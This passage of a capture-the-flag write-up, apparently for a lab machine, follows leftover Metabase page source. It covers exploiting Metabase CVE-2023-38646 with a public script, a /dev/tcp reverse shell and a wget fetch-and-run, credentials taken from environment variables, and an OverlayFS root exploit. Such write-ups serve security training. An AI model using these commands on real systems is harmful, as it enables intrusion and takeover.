"America/Bahia_Banderas", "America/Barbados", "America/Belem", "America/Belize", "America/Blanc-Sablon", "America/Boa_Vista", "America/Bogota", "America/Boise", "America/Buenos_Aires", "America/Cambridge_Bay", "America/Campo_Grande", "America/Cancun", "America/Caracas", "America/Catamarca", "America/Cayenne", "America/Cayman", "America/Chicago", "America/Chihuahua", "America/Ciudad_Juarez", "America/Coral_Harbour", "America/Cordoba", "America/Costa_Rica", "America/Creston", "America/Cuiaba", "America/Curacao", "America/Danmarkshavn", "America/Dawson", "America/Dawson_Creek", "America/Denver", "America/Detroit", "America/Dominica", "America/Edmonton", "America/Eirunepe", "America/El_Salvador", "America/Ensenada", "America/Fort_Nelson", "America/Fort_Wayne", "America/Fortaleza", "America/Glace_Bay", "America/Godthab", "America/Goose_Bay", "America/Grand_Turk", "America/Grenada", "America/Guadeloupe", "America/Guatemala", "America/Guayaquil", "America/Guyana", "America/Halifax", "America/Havana", "America/Hermosillo", "America/Indiana/Indianapolis", "America/Indiana/Knox", "America/Indiana/Marengo", "America/Indiana/Petersburg", "America/Indiana/Tell_City", "America/Indiana/Vevay", "America/Indiana/Vincennes", "America/Indiana/Winamac", "America/Indianapolis", "America/Inuvik", "America/Iqaluit", "America/Jamaica", "America/Jujuy", "America/Juneau", "America/Kentucky/Louisville", "America/Kentucky/Monticello", "America/Knox_IN", "America/Kralendijk", "America/La_Paz", "America/Lima", "America/Los_Angeles", "America/Louisville", "America/Lower_Princes", "America/Maceio", "America/Managua", "America/Manaus", "America/Marigot", "America/Martinique", "America/Matamoros", "America/Mazatlan", "America/Mendoza", "America/Menominee", "America/Merida", "America/Metlakatla", "America/Mexico_City", "America/Miquelon", "America/Moncton", "America/Monterrey", "America/Montevideo", "America/Montreal", "America/Montserrat", "America/Nassau", "America/New_York", "America/Nipigon", "America/Nome", "America/Noronha", "America/North_Dakota/Beulah", "America/North_Dakota/Center", "America/North_Dakota/New_Salem", "America/Nuuk", "America/Ojinaga", "America/Panama", "America/Pangnirtung", "America/Paramaribo", "America/Phoenix", "America/Port-au-Prince", "America/Port_of_Spain", "America/Porto_Acre", "America/Porto_Velho", "America/Puerto_Rico", "America/Punta_Arenas", "America/Rainy_River", "America/Rankin_Inlet", "America/Recife", "America/Regina", "America/Resolute", "America/Rio_Branco", "America/Rosario", "America/Santa_Isabel", "America/Santarem", "America/Santiago", "America/Santo_Domingo", "America/Sao_Paulo", "America/Scoresbysund", "America/Shiprock", "America/Sitka", "America/St_Barthelemy", "America/St_Johns", "America/St_Kitts", "America/St_Lucia", "America/St_Thomas", "America/St_Vincent", "America/Swift_Current", "America/Tegucigalpa", "America/Thule", "America/Thunder_Bay", "America/Tijuana", "America/Toronto", "America/Tortola", "America/Vancouver", "America/Virgin", "America/Whitehorse", "America/Winnipeg", "America/Yakutat", "America/Yellowknife", "Antarctica/Casey", "Antarctica/Davis", "Antarctica/DumontDUrville", "Antarctica/Macquarie", "Antarctica/Mawson", "Antarctica/McMurdo", "Antarctica/Palmer", "Antarctica/Rothera", "Antarctica/South_Pole", "Antarctica/Syowa", "Antarctica/Troll", "Antarctica/Vostok", "Arctic/Longyearbyen", "Asia/Aden", "Asia/Almaty", "Asia/Amman", "Asia/Anadyr", "Asia/Aqtau", "Asia/Aqtobe", "Asia/Ashgabat", "Asia/Ashkhabad", "Asia/Atyrau", "Asia/Baghdad", "Asia/Bahrain", "Asia/Baku", "Asia/Bangkok", "Asia/Barnaul", "Asia/Beirut", "Asia/Bishkek", "Asia/Brunei", "Asia/Calcutta", "Asia/Chita", "Asia/Choibalsan", "Asia/Chongqing", "Asia/Chungking", "Asia/Colombo", "Asia/Dacca", "Asia/Damascus", "Asia/Dhaka", "Asia/Dili", "Asia/Dubai", "Asia/Dushanbe", "Asia/Famagusta", "Asia/Gaza", "Asia/Harbin", "Asia/Hebron", "Asia/Ho_Chi_Minh", "Asia/Hong_Kong", "Asia/Hovd", "Asia/Irkutsk", "Asia/Istanbul", "Asia/Jakarta", "Asia/Jayapura", "Asia/Jerusalem", "Asia/Kabul", "Asia/Kamchatka", "Asia/Karachi", "Asia/Kashgar", "Asia/Kathmandu", "Asia/Katmandu", "Asia/Khandyga", "Asia/Kolkata", "Asia/Krasnoyarsk", "Asia/Kuala_Lumpur", "Asia/Kuching", "Asia/Kuwait", "Asia/Macao", "Asia/Macau", "Asia/Magadan", "Asia/Makassar", "Asia/Manila", "Asia/Muscat", "Asia/Nicosia", "Asia/Novokuznetsk", "Asia/Novosibirsk", "Asia/Omsk", "Asia/Oral", "Asia/Phnom_Penh", "Asia/Pontianak", "Asia/Pyongyang", "Asia/Qatar", "Asia/Qostanay", "Asia/Qyzylorda", "Asia/Rangoon", "Asia/Riyadh", "Asia/Saigon", "Asia/Sakhalin", "Asia/Samarkand", "Asia/Seoul", "Asia/Shanghai", "Asia/Singapore", "Asia/Srednekolymsk", "Asia/Taipei", "Asia/Tashkent", "Asia/Tbilisi", "Asia/Tehran", "Asia/Tel_Aviv", "Asia/Thimbu", "Asia/Thimphu", "Asia/Tokyo", "Asia/Tomsk", "Asia/Ujung_Pandang", "Asia/Ulaanbaatar", "Asia/Ulan_Bator", "Asia/Urumqi", "Asia/Ust-Nera", "Asia/Vientiane", "Asia/Vladivostok", "Asia/Yakutsk", "Asia/Yangon", "Asia/Yekaterinburg", "Asia/Yerevan", "Atlantic/Azores", "Atlantic/Bermuda", "Atlantic/Canary", "Atlantic/Cape_Verde", "Atlantic/Faeroe", "Atlantic/Faroe", "Atlantic/Jan_Mayen", "Atlantic/Madeira", "Atlantic/Reykjavik", "Atlantic/South_Georgia", "Atlantic/St_Helena", "Atlantic/Stanley", "Australia/ACT", "Australia/Adelaide", "Australia/Brisbane", "Australia/Broken_Hill", "Australia/Canberra", "Australia/Currie", "Australia/Darwin", "Australia/Eucla", "Australia/Hobart", "Australia/LHI", "Australia/Lindeman", "Australia/Lord_Howe", "Australia/Melbourne", "Australia/NSW", "Australia/North", "Australia/Perth", "Australia/Queensland", "Australia/South", "Australia/Sydney", "Australia/Tasmania", "Australia/Victoria", "Australia/West", "Australia/Yancowinna", "Brazil/Acre", "Brazil/DeNoronha", "Brazil/East", "Brazil/West", "CET", "CST6CDT", "Canada/Atlantic", "Canada/Central", "Canada/Eastern", "Canada/Mountain", "Canada/Newfoundland", "Canada/Pacific", "Canada/Saskatchewan", "Canada/Yukon", "Chile/Continental", "Chile/EasterIsland", "Cuba", "EET", "EST5EDT", "Egypt", "Eire", "Etc/GMT", "Etc/GMT+0", "Etc/GMT+1", "Etc/GMT+10", "Etc/GMT+11", "Etc/GMT+12", "Etc/GMT+2", "Etc/GMT+3", "Etc/GMT+4", "Etc/GMT+5", "Etc/GMT+6", "Etc/GMT+7", "Etc/GMT+8", "Etc/GMT+9", "Etc/GMT-0", "Etc/GMT-1", "Etc/GMT-10", "Etc/GMT-11", "Etc/GMT-12", "Etc/GMT-13", "Etc/GMT-14", "Etc/GMT-2", "Etc/GMT-3", "Etc/GMT-4", "Etc/GMT-5", "Etc/GMT-6", "Etc/GMT-7", "Etc/GMT-8", "Etc/GMT-9", "Etc/GMT0", "Etc/Greenwich", "Etc/UCT", "Etc/UTC", "Etc/Universal", "Etc/Zulu", "Europe/Amsterdam", "Europe/Andorra", "Europe/Astrakhan", "Europe/Athens", "Europe/Belfast", "Europe/Belgrade", "Europe/Berlin", "Europe/Bratislava", "Europe/Brussels", "Europe/Bucharest", "Europe/Budapest", "Europe/Busingen", "Europe/Chisinau", "Europe/Copenhagen", "Europe/Dublin", "Europe/Gibraltar", "Europe/Guernsey", "Europe/Helsinki", "Europe/Isle_of_Man", "Europe/Istanbul", "Europe/Jersey", "Europe/Kaliningrad", "Europe/Kiev", "Europe/Kirov", "Europe/Kyiv", "Europe/Lisbon", "Europe/Ljubljana", "Europe/London", "Europe/Luxembourg", "Europe/Madrid", "Europe/Malta", "Europe/Mariehamn", "Europe/Minsk", "Europe/Monaco", "Europe/Moscow", "Europe/Nicosia", "Europe/Oslo", "Europe/Paris", "Europe/Podgorica", "Europe/Prague", "Europe/Riga", "Europe/Rome", "Europe/Samara", "Europe/San_Marino", "Europe/Sarajevo", "Europe/Saratov", "Europe/Simferopol", "Europe/Skopje", "Europe/Sofia", "Europe/Stockholm", "Europe/Tallinn", "Europe/Tirane", "Europe/Tiraspol", "Europe/Ulyanovsk", "Europe/Uzhgorod", "Europe/Vaduz", "Europe/Vatican", "Europe/Vienna", "Europe/Vilnius", "Europe/Volgograd", "Europe/Warsaw", "Europe/Zagreb", "Europe/Zaporozhye", "Europe/Zurich", "GB", "GB-Eire", "GMT", "GMT0", "Greenwich", "Hongkong", "Iceland", "Indian/Antananarivo", "Indian/Chagos", "Indian/Christmas", "Indian/Cocos", "Indian/Comoro", "Indian/Kerguelen", "Indian/Mahe", "Indian/Maldives", "Indian/Mauritius", "Indian/Mayotte", "Indian/Reunion", "Iran", "Israel", "Jamaica", "Japan", "Kwajalein", "Libya", "MET", "MST7MDT", "Mexico/BajaNorte", "Mexico/BajaSur", "Mexico/General", "NZ", "NZ-CHAT", "Navajo", "PRC", "PST8PDT", "Pacific/Apia", "Pacific/Auckland", "Pacific/Bougainville", "Pacific/Chatham", "Pacific/Chuuk", "Pacific/Easter", "Pacific/Efate", "Pacific/Enderbury", "Pacific/Fakaofo", "Pacific/Fiji", "Pacific/Funafuti", "Pacific/Galapagos", "Pacific/Gambier", "Pacific/Guadalcanal", "Pacific/Guam", "Pacific/Honolulu", "Pacific/Johnston", "Pacific/Kanton", "Pacific/Kiritimati", "Pacific/Kosrae", "Pacific/Kwajalein", "Pacific/Majuro", "Pacific/Marquesas", "Pacific/Midway", "Pacific/Nauru", "Pacific/Niue", "Pacific/Norfolk", "Pacific/Noumea", "Pacific/Pago_Pago", "Pacific/Palau", "Pacific/Pitcairn", "Pacific/Pohnpei", "Pacific/Ponape", "Pacific/Port_Moresby", "Pacific/Rarotonga", "Pacific/Saipan", "Pacific/Samoa", "Pacific/Tahiti", "Pacific/Tarawa", "Pacific/Tongatapu", "Pacific/Truk", "Pacific/Wake", "Pacific/Wallis", "Pacific/Yap", "Poland", "Portugal", "ROK", "Singapore", "SystemV/AST4", "SystemV/AST4ADT", "SystemV/CST6", "SystemV/CST6CDT", "SystemV/EST5", "SystemV/EST5EDT", "SystemV/HST10", "SystemV/MST7", "SystemV/MST7MDT", "SystemV/PST8", "SystemV/PST8PDT", "SystemV/YST9", "SystemV/YST9YDT", "Turkey", "UCT", "US/Alaska", "US/Aleutian", "US/Arizona", "US/Central", "US/East-Indiana", "US/Eastern", "US/Hawaii", "US/Indiana-Starke", "US/Michigan", "US/Mountain", "US/Pacific", "US/Samoa", "UTC", "Universal", "W-SU", "WET", "Zulu"],

"hide-embed-branding?": false,

"google-auth-client-id": null,

"enable-sandboxes?": false,

"application-font": "Lato",

"available-locales": [

["ar", "Arabic"],

["ar_SA", "Arabic (Saudi Arabia)"],

["bg", "Bulgarian"],

["ca", "Catalan"],

["cs", "Czech"],

["de", "German"],

["en", "English"],

["es", "Spanish"],

["fa", "Persian"],

["fr", "French"],

["id", "Indonesian"],

["it", "Italian"],

["ja", "Japanese"],

["ko", "Korean"],

["nb", "Norwegian Bokmål"],

["nl", "Dutch"],

["pl", "Polish"],

["pt_BR", "Portuguese (Brazil)"],

["ru", "Russian"],

["sk", "Slovak"],

["sq", "Albanian"],

["sr", "Serbian"],

["sv", "Swedish"],

["tr", "Turkish"],

["uk", "Ukrainian"],

["vi", "Vietnamese"],

["zh", "Chinese"],

["zh_CN", "Chinese (China)"],

["zh_HK", "Chinese (Hong Kong SAR China)"],

["zh_TW", "Chinese (Taiwan)"]

],

"landing-page": "",

"setup-token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",

"application-colors": {},

"enable-audit-app?": false,

"anon-tracking-enabled": false,

"version-info-last-checked": null,

"application-logo-url": "app/assets/img/logo.svg",

"application-favicon-url": "app/assets/img/favicon.ico",

"show-metabot": true,

"enable-whitelabeling?": false,

"map-tile-server-url": "[https://](https://){s}.tile.openstreetmap.org/{z}/{x}/{y}.png",

"startup-time-millis": 18689.0,

"redirect-all-requests-to-https": false,

"version": {

"date": "2023-06-29",

"tag": "v0.46.6",

"branch": "release-x.46.x",

"hash": "1bb88f5"

},

"google-auth-enabled": false,

"application-font-files": null,

"loading-message": "doing-science",

"password-complexity": {

"total": 6,

"digit": 1

},

"show-lighthouse-illustration": true,

"cloud-gateway-ips": null,

"enable-content-management?": false,

"enable-serialization?": false,

"ssh-heartbeat-interval-sec": 180,

"enable-sso?": false,

"available-fonts": ["Inter", "Lato", "Lora", "Merriweather", "Montserrat", "Noto Sans", "Open Sans", "Oswald", "Playfair Display", "Poppins", "PT Sans", "PT Serif", "Raleway", "Roboto", "Roboto Condensed", "Roboto Mono", "Roboto Slab", "Slabo 27px", "Source Sans Pro", "Ubuntu"],

"custom-formatting": {}

}

</script>

<script type="application/json" id="_metabaseUserLocalization">

{

"headers": {

"language": "en",

"plural-forms": "nplurals=2; plural=(n != 1);"

},

"translations": {

"": {

"Metabase": {

"msgid": "Metabase",

"msgstr": ["Metabase"]

}

}

}

}

</script>

<script type="application/json" id="_metabaseSiteLocalization">

{

"headers": {

"language": "en",

"plural-forms": "nplurals=2; plural=(n != 1);"

},

"translations": {

"": {

"Metabase": {

"msgid": "Metabase",

"msgstr": ["Metabase"]

}

}

}

}

</script>

<script>

(function() {

window.MetabaseBootstrap = JSON.parse(document.getElementById("_metabaseBootstrap").textContent);

window.MetabaseUserLocalization = JSON.parse(document.getElementById("_metabaseUserLocalization").textContent);

window.MetabaseSiteLocalization = JSON.parse(document.getElementById("_metabaseSiteLocalization").textContent);

var configuredRoot = document.head.querySelector("meta[name='base-href']").content;

var actualRoot = "/";

// Add trailing slashes

var backendPathname = document.head.querySelector("meta[name='uri']").content.replace(/\/*$/, "/");

// e.x. "/questions/"

var frontendPathname = window.location.pathname.replace(/\/*$/, "/");

// e.x. "/metabase/questions/"

if (backendPathname === frontendPathname.slice(-backendPathname.length)) {

// Remove the backend pathname from the end of the frontend pathname

actualRoot = frontendPathname.slice(0, -backendPathname.length) + "/";

// e.x. "/metabase/"

}

if (actualRoot !== configuredRoot) {

console.warn("Warning: the Metabase site URL basename \"" + configuredRoot + "\" does not match the actual basename \"" + actualRoot + "\".");

console.warn("You probably want to update the Site URL setting to \"" + window.location.origin + actualRoot + "\"");

document.getElementsByTagName("base")[0].href = actualRoot;

}

window.MetabaseRoot = actualRoot;

})();

</script>

<link href="app/dist/styles.css?10cd540a50370a0ca610" rel="stylesheet">

<link href="app/dist/app-main.css?cc4b689622cefb93ea5f" rel="stylesheet">

<script src="app/dist/runtime.bundle.js?c033e335af026ba5cb30"></script>

<script src="app/dist/styles.bundle.js?18863dc168329c0e885e"></script>

<script src="app/dist/vendor.bundle.js?af035175c32615124bb8"></script>

<script src="app/dist/app-main.bundle.js?43476296fc5cfde3b632"></script>

</head>

<body>

<div id="root"></div>

</body>

</html>

```

It is a lot of info but I was able to see on the source the version of metabase `"tag": "v0.46.6",` And at this point (late) I googled what is metabase

```
Metabase is **an open source business intelligence tool that lets you create charts and dashboards using data from a variety of databases and data sources**. You don't need to know SQL to create visualizations, but Metabase supports SQL for advanced customization. Learn more about Metabase.
```

At this point I started to search some vulnerability to this  version of metabase and I found one ` Metabase Pre-auth RCE | CVE-2023-38646` 

Here you have a beautiful POC of this vulnerability
[https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/)

I tried with burpsuit this POC and I tried a reverse shell with netcat but somehow this doesn't work 


I found an exploit on python that it helped me to make a solution to this problem 

https://github.com/robotmikhro/CVE-2023-38646

The process was in three steps

1- create a file with a script of a reverse shell
`bash -i >& /dev/tcp/IP/PORT 0>&1`

2-Upload the file with the github script
```
python3 single.py -u http://data.analytical.htb -c "wget http://IP:PORT/rev.sh -O /tmp/rev.sh "
```
3-Execute the script
```
python3 single.py -u http://data.analytical.htb -c "/bin/bash /tmp/rev.sh "
```
(Remember, first of all you must be using netcat listening and when the script is executed you will get the reverse shell)


The first impresion of this machine was strange, when i tried to get the user flag,  I cant retrieve it, and I cannot use a tty , and python wasn't on this machine. I used ifconfig and my ip was something like 172.16.0.2 .. and the OS was Alpine Linux 3.18.2


I tried to find some credentials on the metabase db folder , I used

`cat metabase.db.mv.db | grep -B 5 -A 5 pass`

But I wasnt able to see nothing. Then I executed linpeas.sh on the machine and I understand why I cant have a tty and python wasnt .. even sudo doesnt exist on this machine. I was in a docker container.

With linpeas.sh I found some environment variables , interesting. 
`META_PASS=An4lytics_ds20223#`

I tried to connect via ssh to the machine but it doesnt work, I used An4lytics as user and ds20223# as password.

FInally  with this command I searched for another variables on the system 
`(env || set) 2>/dev/null`

Then I found the user

```
META_USER=metalytics

META_PASS=An4lytics_ds20223#
```

And I was able to connect via ssh to the machine

`ssh metalytics@10.10.11.233`

The privilege escalation was a little more easy for me , because it was my first time on a docker container.

This vulnerability is regardless to the kernel of ubuntu jammy and other distros. Particularly the kernel version of this machine was "6.2.0 jammy jelfish". 

OverlayFS
`CVE-2023-32629, CVE-2023-2640`
https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability

I used this two commands and I was able to be root
```
$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```
and then
```
$ export TD=$(mktemp -d) && cd $TD && unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);d=os.getenv("TD");os.system(f"rm -rf {d}");os.chdir("/root");os.system("/bin/sh")'
```

The next step was just use this command

`cat /root/root.txt`